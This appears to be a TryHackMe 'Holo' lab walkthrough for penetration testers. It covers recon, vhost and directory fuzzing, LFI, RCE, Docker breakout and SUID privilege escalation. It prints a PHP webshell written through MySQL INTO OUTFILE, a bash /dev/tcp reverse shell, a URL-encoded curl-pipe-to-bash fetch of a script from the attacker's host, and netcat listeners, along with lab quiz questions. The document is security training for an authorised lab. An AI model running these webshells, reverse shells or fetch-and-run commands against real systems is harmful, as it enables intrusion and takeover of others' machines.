# Holo

**Room Link:** [https://tryhackme.com/r/room/hololive](https://tryhackme.com/r/room/hololive)



## .NET Basics - CLR - Commonly Lacking Radiation

n integral part of working with Windows and other operating system implementations is understanding C# and its underlying technology, .NET. Many Windows applications and utilities are built in C# as it allows developers to interact with the CLR and Win32 API. We will cover the infrastructure behind .NET and its use cases within Windows further below.\


.NET uses a run-time environment known as the Common Language Runtime (CLR). We can use any .NET language (C#, PowerShell, etc.) to compile into the Common Intermediary Language (CIL). NET also interfaces directly with Win32 and API calls making the optimal solution for Windows application development and offensive tool development.

From Microsoft, ".NET provides a run-time environment, called the common language runtime, that runs the code and provides services that make the development process easier. Compilers and tools expose the common language runtime's functionality and enable you to write code that benefits from this managed execution environment. Code that you develop with a language compiler that targets the runtime is called managed code. Managed code benefits from features such as cross-language integration, cross-language exception handling, enhanced security, versioning and deployment support, a simplified model for component interaction, and debugging and profiling services."

***

.NET consists of two different branches with different purposes, outlined below.

* .NET Framework (Windows only)
* .NET Core (Cross-Compatible)

The main component of .NET is .NET assemblies. .NET assemblies are compiled .exes and .dlls that any .NET language can execute.

The CLR will compile the CIL into native machine code. You can find the flow of code within .NET below.

.NET Language → CIL/MSIL → CLR → machine code

You can also decide to use unmanaged code with .NET; code will be directly compiled from the language into machine code, skipping the CLR. Examples of unmanaged code are tools like Donut and UnmanagedPowerShell. Find a visual of data flow within both managed and unmanaged code below.

![](https://i.imgur.com/ou1uYAu.png)\


Within .NET, there also exists the Dynamic Language Runtime (DLR). This concept is out of scope for this network; however, to learn more about it, check out this article,[https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview)

Now that we have a basic understanding of .NET and how it can interact with the system from .NET languages, we can begin developing and building offensive tooling to aid us in our operations.



## .NET Basics - Rage Against the Compiler

An important part of C# and building offensive tooling is understanding how to compile your tools and tools without pre-built releases. To work with C# and building tools, we will again utilize Visual Studio. It is important to note that Visual Studio is not the only C# compiler, and there are several other compilers outlined below.

* Roslyn
* GCC
* MinGW
* LLVM
* TCC
* MSBuild\


In this task, we will be using Visual Studio as it is the easiest to comprehend and work with when developing in C#. Visual Studio also allows us to manage packages and .NET versions without headache when building from a solution file.



To build and develop C# in Visual Studio, we recommend using the Windows development virtual machine, [https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/).\


To begin using Visual Studio, you will need a valid Microsoft/Outlook account to sign in and authenticate to Visual Studio. It is a simple and free process to create an account if you do not already have one. For more information, check out the Outlook page, [https://outlook.live.com/owa/](https://outlook.live.com/owa/).



We will begin our compiling journey by creating and building a solution file from the code we wrote in the previous task.\


To create a solution file for .NET Core, navigate to _Create a new project > Console App (.NET Core)_. If you want to open a preexisting solution file/project, navigate to _Open a project or solution_.

\


From here, you can configure your project's Name, Location, and Solution Name. Find a screenshot of the configuration menu below.

<figure><img src="https://i.imgur.com/VuOvFfi.png" alt=""><figcaption></figcaption></figure>

Once created, Visual Studio will automatically add a starting C# hello world file and maintain the solution file for building. Find a screenshot of the file structure below.\


<figure><img src="https://i.imgur.com/wlpOqPc.png" alt=""><figcaption></figcaption></figure>

You will notice that Visual Studio will break down the Dependencies, Classes, and Methods in this file tree which can be helpful when debugging or analyzing code.

From here, we should have a working, automatically generated C# hello world file that we can use to test our build process. To build a solution file, navigate to Build > Build Solution or hold Ctrl+Shift+B. You can also build from applications themselves rather than project solutions; however, that is out of scope for this network. Once run, the console tab should open or begin outputting information. From here, you can monitor the build process and any errors that may occur. If successful, it will output Build: 1 succeeded and the path to the compiled file. Find a screenshot of the build process below.\


<figure><img src="https://i.imgur.com/6V2nVfe.png" alt=""><figcaption></figcaption></figure>

You should now have a successfully compiled file that you can run and use on other systems with corresponding .NET versions!

It is important to note that when building other developer's tools, they will often contain several dependencies and packages. Ensure the machine you are using to build the solution has access to the internet to retrieve the needed packages.

## Initial Recon -  NOT EVERY GEEK WITH A COMMODORE 64 CAN HACK INTO NASA!

Before we get too overzealous in attacking web servers and hacking the world, we need to identify our scope and perform some initial recon to identify assets. Your trusted agent has informed you that the scope of the engagement is 10.200.x.0/24 and 192.168.100.0/24. To begin the assessment, you can scan the ranges provided and identify any public-facing infrastructure to obtain a foothold.\


Nmap is a commonly used port scanning tool that is an industry-standard that is fast, reliable, and comes with NSE scripts. Nmap also supports CIDR notation, so we can specify a /24 notation to scan 254 hosts. There are many various arguments and scripts that you can use along with Nmap; however, we will only be focusing on a few outlined below.

* `sV` scans for service and version
* `sC` runs a script scan against open ports.
* `-p-` scans all ports 0 - 65535
* `-v` provides verbose output

**Syntax:** `nmap -sV -sC -p- -v 10.200.x.0/24`

Once you have identified open machines on the network and basic ports open, you can go back over the devices again individually with a more aggressive scan such as using the `-A` argument.

### Answer the questions&#x20;

**What is the last octet of the IP address of the public-facing web server?**

**How many ports are open on the web server?**

**What CME is running on port 80 of the web server?**

**What version of the CME is running on port 80 of the web server?**

**What is the HTTP title of the web server?**

## Web App Exploitation - Punk Rock 101 err Web App 101

After scanning the Network range, you discover a public-facing Web server. You take to your keyboard as you begin enumerating the Web Application's attack surface. Your target is L-SRV01 found from initial reconnaissance.

Important Note: a large number of users have reported L-SRV01 is crashing. This is likely due to multiple people running Gobuster and WFuzz at once. It is highly recommended that you reduce the thread count while attempting file/directory enumeration on L-SRV01.

Virtual Hosts or vhosts are a way of running multiple websites on one single server. They only require an additional header, Host, to tell the Web Server which vhost the traffic is destined; this is particularly useful when you only have one IP address but can add as many DNS entries as you would like. You will often see hosted services like Squarespace or WordPress do this.\


We can utilize Gobuster again to identify potential vhosts present on a web server. The syntax is comparable to fuzzing for directories and files; however, we will use the `vhosts` mode rather than `dir` this time. `-u` is the only argument that will need a minor adjustment from the previous fuzzing command. `-u` is the base URL that Gobuster will use to discover vhosts, so if you provide `-u` "[https://tryhackme.com](https://tryhackme.com/)" GoBuster will set the host to "[tryhackme.com](http://tryhackme.com/)" and set the host header to `Host: LINE1.tryhackme.com`. If you specify "[https://www.tryhackme.com](https://www.tryhackme.com/)", GoBuster will set the host to "[www.tryhackme.com](http://www.tryhackme.com/)" and the host header to `Host: LINE1.www.tryhackme.com`. Be careful that you don't make this mistake when fuzzing.\


Syntax: `gobuster vhost -u <URL to fuzz> -w <wordlist>`

We recommend using the Seclists "subdomains-top1million-110000.txt" wordlist for fuzzing vhosts.

Wfuzz also offers vhost fuzzing capability similar to its directory brute-forcing capability. The syntax is almost identical to the Gobuster syntax; however, you will need to specify the host header with the `FUZZ` parameter, similar to selecting the parameter when directory brute-forcing.\


Syntax: `wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>`

Now that we have some vhosts to work off from fuzzing, we need a way to access them. If you're in an environment where there is no DNS server, you can add the IP address followed by the FQDN of the target hosts to your _/etc/hosts_ file on Linux or _C:\\\Windows\\\System32\\\Drivers\\\etc\\\hosts_ file if you're on Windows.&#x20;

### Answer the questions&#x20;

## Web App Exploitation - What the Fuzz?

Now that we have a basic idea of the web server's virtual host infrastructure, we can continue our asset discovery by brute-forcing directories and files. Your target is still L-SRV01 found from initial reconnaissance.

HTTP and HTTPS (DNS included) are the single most extensive and most complex set of protocols that make up one entity that we know as the Web. Due to its complexity, many vulnerabilities are introduced on both the client-side and server-side.\


Asset discovery is the most critical part of discovering the attack surface on a target Web Server. There's always a chance that any web page you discover may contain a vulnerability, so you need to be sure that you don't miss any. Since the web is such a big surface, where do we start?

We ideally want to discover all the target-owned assets on the Web Server. This is much easier for the target to do because they can run a `dir` or `ls` in the root of the Web Server and view all the contents of the web server, but we don't have that luxury (typically, there are a few protocols like WebDAV that allow us to list the contents).\


The most popular method is to send out connections to the remote web server and check the HTTP status codes to determine if a valid file exists, 200 OK if the file exists, 404 File Not Found if the file does not exist. This technique is knowing as fuzzing or directory brute-forcing.\


There are many tools available to help with this method of asset discovery. Below is a short list of commonly used tools.

* Gobuster
* WFuzz
* dirsearch
* dirbuster

The first tool we will be looking at for file discovery is Gobuster; from the Gobuster Kali page, "Gobuster is a scanner that looks for existing or hidden web objects. It works by launching a dictionary attack against a web server and analyzing the response."\


Gobuster has multiple options for attack techniques; within this room, we will primarily utilize the `dir` mode. Gobuster will use a few common arguments frequently with Gobuster; these can be found below.

* `-u` or `—url`
* `-w` or `—wordlist`
* `-x` or `—extensions`
* `-k` or `—insecureurl`

Syntax: `gobuster dir -u <URL to fuzz> -w <wordlist to use> -x <extensions to check>`

We recommend using the Seclists "big.txt" wordlist for directory fuzzing.

Important Note: a large number of users have reported L-SRV01 is crashing. This is likely due to multiple people running Gobuster and WFuzz at once. It is highly recommended that you reduce the thread count while attempting file/directory enumeration on L-SRV01.

If you notice your fuzzing is going slower than you would like, Gobuster can add threads to your attack. The parameter for threading is `-t` or `—threads` Gobuster accepts integers between 1 and 99999. By default, Gobuster utilizes ten threads. As you increase threads, Gobuster can become further unstable and cause false positives or skip over lines in the wordlist. Thread count will be dependent on your hardware. We recommend sticking between 30 and 40 threads.\


Syntax: `gobuster -t <threads> dir -u <URL to fuzz> -w <wordlist>`

In the real world, you always want to be mindful of how much traffic you're sending to the Web Server. You always want to make sure you're allowing enough bandwidth for actual clients to connect to the server without any noticeable delay. If you're in a Red Team setting where stealth is critical, you'll never want to have a high thread count.\


The second tool we will be looking at is Wfuzz. From the Wfuzz GitHub, "Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing,etc.". As you can see, Wfuzz is a comprehensive tool with many capabilities; we will only be looking at a thin layer of what it can do. Compared to the Gobuster syntax, it is almost identical; find the syntax arguments below.

* `-u` or `—url`
* `-w` or `—wordlist`

The critical distinction in syntax between the two is that Wfuzz requires a `FUZZ` parameter to be present within the URL where you want to substitute in the fuzzing wordlist.

Syntax: `wfuzz -u example.com/FUZZ.php -w <wordlist>`

WFuzz also offers some advanced usage with specific parameters that we will not be covering in-depth within this room but are important to note. These can be found below.

* `—hc` Hide status code
* `—hw` Hide word count
* `—hl` Hide line count
* `—hh` Hide character count

These parameters will help find specific things more accessible, for example, if you're fuzzing for SQLi. You know that an internal server error will occur if an invalid character is entered. The Database query will fail (which should result in an HTTP Status code 500 \[Internal Server Error]); you can use an SQLi wordlist and filter on status codes 200-404.

### Answer the questions

**What file leaks the web server's current directory?**

**What file loads images for the development domain?**

**What is the full path of the credentials file on the administrator domain?**



## Web App Exploitation -  LEEROY JENKINS!

For the following sections on web application exploitation, we have provided a development instance of a test server to practice attacks before moving over to the actual production web server.\


To set up the test environment, you will need to install apache 2, PHP, and the environment files. Follow the steps outlined below.

1. `apt install apache2 php`
2. edit configuration files to use port 8080
3. `systemctl start apache2`
4. `wget https://github.com/Sq00ky/holo-bash-portscanner/raw/main/holo-playground.zip -O /var/www/holo.zip && unzip /var/www/holo.zip`

## Web App Exploitation - What is this? Vulnversity?

Now that you understand the file structure and infrastructure behind the webserver, you can begin attacking it. Based on technical errors and misconfigurations found on the webserver, we can assume that the developer is not highly experienced. Use the information that you have already identified from asset discovery to move through the attack methodically.\


From OWASP, "Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application." LFI can be trivial to identify, typically found from parameters, commonly used when downloading files or referencing images. Find an example below from the test environment.

Example: `http://127.0.0.1/img.php?file=CatPics.jpg`

To exploit this vulnerability, we need to utilize a technique known as directory traversal. From Portswigger, "Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application." This vulnerability is exploited by using a combination of `../` in sequence to go back to the webserver's root directory. From here, you can read any files that the webserver has access to. A common way of testing PoC for LFI is by reading `/etc/passwd`. Find an example below from the test environment.

Example: `http://127.0.0.1/img.php?file=../../../../../../../../etc/passwd`

In the above example, the `?file` parameter is the parameter that we exploit to gain LFI.

That is the entire concept of LFI. For the most part, LFI is used to chain to other exploits and provide further access like RCE; however, LFI can also give you some helpful insight and enumerate the target system depending on the access level webserver. An example of using LFI to read files is finding an interesting file while fuzzing; however, you get a 403 error. You can use LFI to read the file and bypass the error code.

### Answer the questions

**What file is vulnerable to LFI on the development domain?**

**What parameter in the file is vulnerable to LFI?**

**What file found from the information leak returns an HTTP error code 403 on the administrator domain?**

**Using LFI on the development domain read the above file. What are the credentials found from the file?**

## Web App Exploitation -  Remote Control Empanadas

Now that you have access to the administrator subdomain, you can fuzz for remote code execution and attempt to identify a specific parameter that you can exploit to gain arbitrary access to the machine.\


Remote code execution, also known as arbitrary code execution, allows you to execute commands or code on a remote system. RCE can often exploit this by controlling a parameter utilized by a web server.\


One method of attempting to identify RCE is by fuzzing for a vulnerable parameter using Wfuzz. Similar to how we used Wfuzz for asset discovery. The syntax is the same as previous commands; however, this time we will replace the `FUZZ` command at the end along with a `?` so that the complete `FUZZ` parameter is `?FUZZ=ls+-la` Find an example below from the test environment.

Syntax: `wfuzz -u <http://example.com/?FUZZ=ls+-la> -w <wordlist> --hw 2`

We suggest using the Seclists "big.txt" for fuzzing RCE parameters.\


Now that we know we can control the parameter, we can attempt to gain RCE on the box. Find an example below from the test environment.\


Command used: `curl -vvv http://localhost:8080/test.php?cmd=ls+-la && echo ""`

Rather than fuzzing all the pages that we find to identify RCE, we can utilize code analysis to look at the code running on a page and infer whether or not the code may be vulnerable. Find an example below of how code can run a command and is vulnerable to an attacker controlling the parameter.\


`<?php` \
`$id = $_GET["cmd"];`\
`if ($_GET["cmd"] == NULL){`\
`echo "Hello " . exec("whoami") . "!";`\
`} else {`\
`echo "Hello " . exec($id);`\
`}`\
`?>`

To identify RCE, you can decide whether you want to fuzz parameters of files or you want to review the source code of a file. Your approach may also differ depending on the scenario you are in and what resources or footholds you have at your disposal.

Once you have RCE on the system, you can use a reverse shell such as netcat to gain a shell on the box. Refer to the following cheat sheet for help with reverse shells. [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Answer the questions

**What file is vulnerable to RCE on the administrator domain?**

**What parameter is vulnerable to RCE on the administrator domain?**

**What user is the web server running as?**

## Post Exploitation - Meterpreter session 1 closed. Reason: RUH ROH

Now that we have a shell on the box, we want to stabilize our shell. For the most part, stabilizing shells is straightforward by using other utilities like python to help; however, some steps can take longer or change depending on the shell you use. The below instructions will be for bash and ZSH; any other shells or operating systems, you will need to do your research on stabilizing shells within their environment.

Instructions found throughout this room are inspired by this fantastic blog post, [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). All credit for the techniques shown goes to ropnop.

There are several ways to stabilize a shell; we will be focusing on using python to create a pseudo-terminal and modifying stty options. The steps are the same for all target machines, but they may differ depending on the shell or operating system used on your attacking machine.\


To begin, we will create a pseudo-terminal using python. The command can be found below.

Syntax: `python -c 'import pty; pty.spawn("/bin/bash")'`

Once we have a pseudo shell, we can pause the terminal and modify stty options to optimize the terminal. Follow the steps below exactly for bash shells.

1\. `stty raw -echo`

2\. `fg`

Note: If you're using ZSH, you must combine `stty raw -echo;fg` onto one line, or else your shell will break &#x20;

At this point, you will get your pseudo-terminal back, but you may notice that whatever you type does not show up. For the next step, you will need to type blindly.

3\. `reset`

4\. `export SHELL=BASH`

For the next two steps, you will need to use the information you got from step 1.&#x20;

5\. `export SHELL=BASH`

6\. `export TERM=<TERMINAL>`

7\. `stty rows <num> columns <cols>`

## Situational Awareness -  Docker? I hardly even know her!

Now that we have gained a shell onto the webserver, we need to perform some situational awareness to figure out where we are. We know from looking through some files when we exploited LFI that this may be a container. We can run some further enumeration and information gathering to identify whether that is true or not and anyway misconfigurations that might allow us to escape the container.\


From the Docker documentation, "A container is a standard unit of software that packages up code and all its dependencies, so the application runs quickly and reliably from one computing environment to another. A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries, and settings."\


<figure><img src="https://i.imgur.com/2oFwU49.png" alt=""><figcaption></figcaption></figure>

Containers have networking capabilities and their own file storage. They achieve this by using three components of the Linux kernel:

* Namespaces
* Cgroups
* OverlayFS

But we're only going to be interested in namespaces here; after all, they lay at the heart of it. Namespaces essentially segregate system resources such as processes, files, and memory away from other namespaces.\


Every process running on Linux will be assigned a PID and a namespace.

Namespaces are how containerization is achieved! Processes can only "see" the process that is in the same namespace - no conflicts in theory. Take Docker; for example, every new container will be running as a new namespace, although the container may be running multiple applications (and, in turn, processes).\


Let's prove the concept of containerization by comparing the number of processes there are in a Docker container that is running a web server versus the host operating system at the time.\


We can look for various indicators that have been placed into a container. Containers, due to their isolated nature, will often have very few processes running in comparison to something such as a virtual machine. We can simply use `ps aux` to print the running processes. Note in the screenshot below that there are very few processes running?

Command used: `ps aux` \


<figure><img src="https://i.imgur.com/NkdQRCE.png" alt=""><figcaption></figcaption></figure>

Containers allow environment variables to be provided from the host operating system by the use of a `.dockerenv` file. This file is located in the "/" directory and would exist on a container - even if no environment variables were provided.

Command used: `cd / && ls -lah`

![](https://i.imgur.com/YbH0rGm.png)\


Cgroups are used by containerization software such as LXC or Docker. Let's look for them by navigating to `/proc/1` and then catting the "cgroup" file... It is worth mentioning that the "cgroups" file contains paths including the word "docker".

![](https://i.imgur.com/LxU3w2p.png)

## Situational Awareness -  Living off the LANd

We now know that we are in a docker container. Since we know that we are in a docker container, we can continue with situation awareness and enumeration to determine what we can do and what other paths we can take to continue attacking this server. A critical part of situational awareness is identifying network and host information. This can be done via port scanning and network tooling.\


In this task, we will be covering using what we have at our disposal in a limited environment to gain information and awareness of the environment. We will showcase both bash and python port scanners that you can utilize as both are common to have inside of a system or container and other tricks that can be used, such as Netcat and statically compiled binaries.\


The first method of port scanning we will be covering is using bash. In bash, we can utilize `/dev/tcp/ipaddr/port`; this will act as a built-in scanner to gather information on the container ports. This utility is broken down below.\


* `/dev/` contains all hardware devices, such as NIC, HDD, SSD, RAM
* `/dev/tcp/` pseudo-device of your ethernet/wireless card opens a socket when data is directed either in or out.

For more information about this, check out the Linux Documentation Project. [https://tldp.org/LDP/abs/html/devref1.html](https://tldp.org/LDP/abs/html/devref1.html)\


We can use this to our advantage to scan internal ports by piping a list of ports into it. Find an example of a full bash port scanner below.

### **Port Scanner #1 - portscanner.sh**

```
#!/bin/bash
ports=(21 22 53 80 443 3306 8443 8080)
for port in ${ports[@]}; do
timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null" 
done
```

The second method of port scanning we will cover is using python. To scan ports with python, we will need to use the `sockets` library to open connections and enable network connectivity. The script itself is as simple as opening connections to sequencing ports in a loop. Find an example of the full python port scanner below.

### **Port Scanner #2 - portscanner.py**

```
#!/usr/bin/python3
import socket
host = "1.1.1.1"
portList = [21,22,53,80,443,3306,8443,8080]
for port in portList:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
  s.connect((host,port))
  print("Port ", port, " is open")
 except:
  print("Port ", port, " is closed")
```

The mainline of code doing all the work is `socket.AF_INET, socket.SOCK_STREAM` this will be a precursor to opening a connection to the specified host and port.

### **Port Scanner #3 - nc**

The third method we will look at is unique and uses Netcat to connect to a range of ports. Netcat is a reasonably common utility on all Linux boxes, so it is safe to assume that we will always have it at our disposal. Find example syntax below.

Syntax: `nc -zv 192.168.100.1 1-65535`

Along with these living off-the-land scripts, we can also utilize statically compiled binaries. A statically compiled binary is similar to any other binary with all libraries and dependencies included in the binary. This makes it so that you can run the binary on any system with the same architecture (x86, x64, ARM, etc). There are several places that you can download these binaries and compile them yourselves. Check out this GitHub for a list of stable binaries. [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries).

## Situational Awareness - Dorkus Storkus - Protector of the Database

Continuing with situational awareness, we can begin looking for any interesting configuration files or other pieces of information that we can gather without actively exploiting the box. We can also attempt to loot services on the device, such as MySQL.\


Since we know the server we are attacking is a web server, we can assume it runs some SQL or database on the backend. Often, these databases may be secure from someone accessing them from the outside, but when on the server, they are often very insecure and can openly read the configuration files.

When we get onto a server running MySQL, we can begin our situational awareness and information looting/exfiltration by reading the `db_connect.php` file. Web servers require this file to connect PHP and SQL. This file is often not readable externally, but you can easily read it and obtain information from it if you have access to an insecure internal server. This file will typically be present at the root of the web page, such as `/var/www`. Find an example of this configuration file below.\


`<?php`\
`define('DB_SRV', '127.0.0.1');`\
`define('DB_PASSWD', 'password');`\
`define('DB_USER', 'username');`\
`define('DB_NAME', 'database');`\
`$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);`\
`?>`

As you can see, we can get much important information from this file: server address, password, username, database name. This can help us to then access and loot the database. It is essential to understand the scope and what information you can and cant exfiltrate and loot. Before exfiltration, you should have clear communication and plans with your target. Hololive has permitted you to exfiltrate names and passwords within the "DashboardDB" database in this engagement.

To access the database, you will need to utilize a binary of the database access tool used. The database will often be MySQL; however, this can change from server to server, and location may also vary. To use MySQL, you will only need to specify the username using `-u`. You will also need to specify the `-p` parameter; however, it does not take an argument.

When directly accessing a database using MySQL, it will put you into a local database hosted on the machine. You can also use MySQL to access remote databases using the `-h` parameter. Find an example of usage below.\


Syntax: `mysql -u <username> -p -h 127.0.0.1`

If successful, we should now have access to a remote database. From here, we can use SQL syntax to navigate and utilize the database. We will be covering a few essential SQL commands that you can use to understand how to navigate a SQL database quickly. For more information, check out the MySQL documentation. [https://dev.mysql.com/doc/](https://dev.mysql.com/doc/). \


* `show databases;` provides a list of available databases.
* `use <database>;` navigates to the provided database.
* `show tables;` provides a list of available tables within the database.
* `show columns from <table>;` outputs columns of the provided table.
* `select * from <table>;` outputs all contents of the provided table.

### Answer the questions

**What is the server address of the remote database?**

**What is the password of the remote database?**

**What is the username of the remote database?**

**What is the database name of the remote database?**

**What username can be found within the database itself?**

## Docker Breakout -  Making Thin Lizzy Proud

Now that you have identified that you are in a container and have performed all the information gathering and situational awareness you can, you can escape the container by exploiting the remote database.\


There are several ways to escape a container, all typically stemming from misconfigurations of the container from services or access controls.\


For more information about container best practices and docker security, check out this OWASP cheat-sheet, [https://cheatsheetseries.owasp.org/cheatsheets/Docker\_Security\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Docker\_Security\_Cheat\_Sheet.html).\


A method that's not quite as common is Exploitation. Exploits to escape Containers aren't as common and typically rely on abusing a process running on the host machine. Exploits usually require some level of user interaction, for example, [CVE-2019-14271](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/). It can also be beneficial to use a container enumeration script such as DEEPCE, [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce).\


Since we gained access to a remote database, we can utilize it to gain command execution and escape the container from MySQL.\


The basic methodology for exploiting MySQL can be found below.

* Access the remote database using administrator credentials
* Create a new table in the main database
*   Inject PHP code to gain command execution

    Example code: `<?php $cmd=$_GET["cmd"];system($cmd);?>`
* Drop table contents onto a file the user can access
* Execute and obtain RCE on the host.

Looking at the above exploit may seem complicated, but we can break it down further and provide more context to make it simpler.\


We can use a single command to inject our PHP code into a table and save the table into a file on the remote system. We are writing any code that we want onto the remote system from this command, which we can then execute, giving use code execution. Find the command used below.\


Command used: `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`

Now that we have a file that we control dropped on the system, we can curl the address and obtain RCE from the dropped file. Find example usage below.\


Example usage: `curl 127.0.0.1:8080/shell.php?cmd=whoami`

### Answer the questions

**What user is the database running as?**

## Docker Breakout -Going%20out%20with%20a%20SHEBANG%21

Now that you have escaped the container and have RCE on the host, you need to create a reverse shell and obtain a way to gain a stable shell onto the box.\


There are several ways to obtain a reverse shell on a box once you have RCE. Outlined below are a few of the most common methods used.

* netcat
* bash
* python
* perl

For more information about various payloads and reverse shells, you can use check out these two resources. [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

In this task, we will be covering how to use a basic bash reverse shell along with URL encoding to drop a script directly into bash. Using URL encoding to our advantage, we can ease much pain when executing a payload as often special characters such as `&, ', !, ;, ?` will cause serious issues.

To begin, we will create a simple payload by placing the below code into a `.sh` file.

`#!/bin/bash`\
`bash -i >& /dev/tcp/tun0ip/53 0>&1`

The first line will declare that we are using the bash scripting language. The second line is the payload itself. For more information about this payload, check out this explain shell, [https://explainshell.com/explain?cmd=bash+-i+>%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0>%261](https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0%3E%261).\


Now that you have the payload ready to go, you can start up a local web server on your attacking machine using either _http.server_ or _updog_ or _php_. You can find example usage for all three below.

* `python3 -m http.server 80`
* `updog`
* `php -S 0.0.0.0:80`

Once you have a server started hosting the file, we can compile a command to execute the file. Find the command below.\


Unencoded command: `curl http://10.x.x.x:80/shellscript.sh|bash &`

As we have already mentioned, special characters can cause issues within URLs. To combat this, we can utilize URL encoding on any special characters. Find the encoded command below.

Encoded command: `curl%20http%3A%2F%2F10.x.x.x%3A80%2Fshellscript.sh%7Cbash%20%26`

The above command is entirely ready to go. You will only need to change the IP address and the file name within the command; this does not require you to change any of the URL encoding present.

You can now start a listener using Netcat or Metasploit to catch your reverse shell once executed. Find commands below to start listeners.

* `nc -lvnp 53`
* `use exploit/multi/handler`

Now that you have the full payload and execution command ready, you can use it and the RCE to gain a shell onto the box. Find the full command below.

Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.x.x.x%3A80%2Fshellscript.sh%7Cbash%20%26'`

## Privilege Escalation -  Call me Mario, because I got all the bits

Note: Please be mindful of other users trying to proceed in the network. Please do not stop the Docker container from running. It will prevent users from proceeding throughout the network. Also, please clean up after yourself. If you transfer a docker container image to the VM, remember to remove it after you finish elevating privileges.

Now that we have a shell on L-SRV01 and escaped the container, we need to perform local privilege escalation to gain root on the box.\


Local privilege escalation is when you take your average level user access and exploit misconfigurations and applications to gain privileged level access. This is typically done by exploiting a specific application or service that was misconfigured on the device.\


Several resources can help you through privilege escalation on Linux. Some of these resources are outlined below for you to use.

* [https://book.hacktricks.xyz/linux-unix/privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/](https://github.com/swisskyrepo/PayloadsAllTheThings/)
* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

In this task, we will be covering one specific privilege escalation technique and a script that we can use to speed along the process of finding misconfigurations we can exploit.\


We will utilize a script called Linpeas to run a thorough check of potential exploits to begin our privilege escalation attempts. [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).\


To use Linpeas, we need to download the script from the repository above on our attacking machine. Then we can utilize a web hosting service such as http.server, updog, or php to host the file onto the target machine. Linpeas does not require any arguments or parameters to run; you only need to run it as a standard binary.\


Syntax: `./linpeas.sh`

Linpeas may take around 5-10 minutes to complete. Once complete, you would need to parse through the output and look for any potentially valuable information.\


The specific exploit that we will be looking at is abusing the SUID bit set on binaries. From [linux.com](http://linux.com/) "SUID (Set owner User ID upon execution) is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherits access permissions from the logged-in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather than the user who runs it." This means that if the program or file is running as root and we have access to it, we can abuse it to grant us root-level access. Below you can find what the SUID bit looks like, along with a table of other bits that can be set.\


![](https://i.imgur.com/LN2uOCJ.png)

| Permission            | On Files                                                                           | On Directories                                                       |
| --------------------- | ---------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| <p>SUID Bit<br></p>   | <p>User executes the file with permissions of the <em>file</em> owner<br></p>      | -                                                                    |
| <p>SGID Bit<br></p>   | <p>User executes the file with the permission of the <em>group</em> owner.<br></p> | <p>File created in directory gets the same group owner.<br></p>      |
| <p>Sticky Bit<br></p> | <p>No meaning<br></p>                                                              | <p>Users are prevented from deleting files from other users.<br></p> |

Besides using Linpeas to find the files with a SUID bit, you can also use a bash one-liner shown below to search for files with this bit set.\


Command: `find / -perm -u=s -type f 2>/dev/null`

Once we have identified a file that we thank may be exploitable, we need to search for an exploit for it. A helpful resource to search for exploits on specific applications and programs is GTFOBins, [https://gtfobins.github.io/](https://gtfobins.github.io/).\


An example of an exploit can be found below for a dig SUID. Exploits may vary between each application and vulnerability as each has its unique ways security researchers have found they can be abused.\


![](https://i.imgur.com/alLGI6R.png)\


If successful, you should now have the same permission levels as the binary you exploited.

### Answer the questions

**What is the full path of the binary with an SUID bit set on L-SRV01?**

**What is the full first line of the exploit for the SUID bit?**



